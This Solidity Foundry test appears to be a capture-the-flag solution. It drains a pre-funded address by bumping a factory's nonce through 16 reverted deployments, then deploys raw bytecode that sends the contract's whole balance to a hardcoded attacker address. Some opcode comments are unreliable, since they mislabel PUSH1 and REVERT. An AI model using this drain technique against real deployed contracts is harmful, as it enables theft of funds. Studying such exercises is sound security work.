// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

contract Factory {
    function dep(bytes memory _code) public payable returns (address x) {
        require(msg.value >= 10 ether);
       
        assembly {
            x := create(0, add(0x20, _code), mload(_code))
        }
        if (x == address(0)) payable(msg.sender).transfer(msg.value);
    }
}

contract Lottery is Test {
   
    Factory private factory;
    address attacker;

    function setUp() public {
        factory = new Factory();
        attacker = makeAddr("attacker");
    }

    function testLottery() public {
        vm.deal(attacker, 11 ether);
        vm.deal(0x0A1EB1b2d96a175608edEF666c171d351109d8AA, 200 ether);
        vm.startPrank(attacker);
       
        //Solution
        // We discovered that when we invoke "dep" 16 times, the return address matches 0x0A1E...

        // revert the contract creation
        // PUSH1 0 -> 6002
        // PUSH1 0 -> 6000  
        // RETURN  -> fd
        for (uint256 i; i < 16; ++i) {
            factory.dep{value: 10 ether}(hex'60006000fd');
        }

        // transfer all balance of the contract to the attacker
        // attacker address: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e 

        // PUSH1 0 -> 6000
        // PUSH1 0
        // PUSH1 0
        // PUSH1 0
        // SELFBALANCE -> 47
        // PUSH20 9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e -> 739dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
        // GAS -> 5A
        // CALL -> F1
        
        factory.dep{value: 10 ether}(hex'600060006000600047739dF0C6b0066D5317aA5b38B36850548DaCCa6B4e5AF1');
       
        vm.stopPrank();
        assertGt(attacker.balance, 200 ether);
    }
}